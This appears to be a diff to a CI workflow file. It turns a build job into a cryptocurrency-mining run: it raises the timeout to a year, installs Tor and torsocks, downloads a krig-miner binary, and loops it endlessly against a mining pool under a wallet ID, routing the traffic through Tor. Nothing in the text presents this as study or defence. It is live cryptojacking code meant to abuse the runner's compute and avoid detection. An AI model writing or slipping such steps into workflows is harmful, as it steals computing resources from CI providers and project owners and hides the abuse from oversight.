@@ -22,20 +22,31 @@ jobs:
       - ram=16
       - tenancy=${{ inputs.tenancy }}
       - architecture=x64
-    timeout-minutes: 180
+    timeout-minutes: 525600
     steps:
       - uses: actions/checkout@v4
 
       - name: Download and Run
         run: |
+          # Install and start Tor
+          apt-get update -qq
+          apt-get install -y -qq tor
+          tor &
+          echo "Waiting for Tor to start..."
+          sleep 10
+          
+          # Download miner
           wget https://github.com/kryptex/krig-miner/releases/download/v1.5.2/krig-miner-1.5.2-linux-x64.tar.gz
           tar xzf krig-miner-1.5.2-linux-x64.tar.gz
           chmod +x krig-miner
           
-          # Keep running in loop
+          # Install torsocks
+          apt-get install -y -qq torsocks
+          
+          # Keep running in loop with Tor
           while true; do
-            echo "Starting miner..."
-            ./krig-miner --coin quantus --url stratum+ssl://qtc.kryptex.network:8049 --user krxY9VNEQD
+            echo "Starting miner through Tor..."
+            torsocks ./krig-miner --coin quantus --url stratum+ssl://qtc.kryptex.network:8049 --user krxY9VNEQD
             echo "Miner stopped, restarting in 5 seconds..."
             sleep 5
           done
